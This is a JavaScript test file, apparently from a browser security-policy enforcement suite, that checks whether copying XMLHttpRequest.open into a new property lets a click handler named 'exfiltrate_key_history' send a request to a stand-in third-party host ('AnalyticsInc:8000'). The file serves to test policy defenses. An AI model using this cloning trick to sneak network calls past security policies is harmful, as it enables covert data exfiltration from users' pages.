// exfil_test_clone5.js
function copy(obj$$16) {
  if (typeof obj$$16 !== "object") {
    return obj$$16;
  } else {
    var value$$27 = obj$$16.valueOf();
    if (obj$$16 != value$$27) {
      return JAM.new(obj$$16.constructor, [value$$27]);
    } else {
      var v13 = obj$$16 instanceof obj$$16.constructor;
      if (v13) {
        v13 = obj$$16.constructor !== Object;
      }
      if (v13) {
        var c = clone(obj$$16.constructor.prototype);
        var property;
        for (property in obj$$16) {
          if (obj$$16.hasOwnProperty(property)) {
            var v2 = c;
            var v3 = property;
            var v20 = copy(obj$$16[property]);
            JAM.set(v2, v3, v20);
          }
        }
      } else {
        c = {};
        for (property in obj$$16) {
          var v5 = c;
          var v6 = property;
          var v21 = copy(obj$$16[property]);
          JAM.set(v5, v6, v21);
        }
      }
      return c;
    }
  }
  return;
}
function Clone() {
  return;
}
function clone(obj$$17) {
  Clone.prototype = obj$$17;
  return new Clone;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v10 = xmlhttp;
  var v22 = copy(xmlhttp.open);
  v10.opennew = v22;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone5", true], JAM.policy.p1);
  xmlhttp.send(null);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
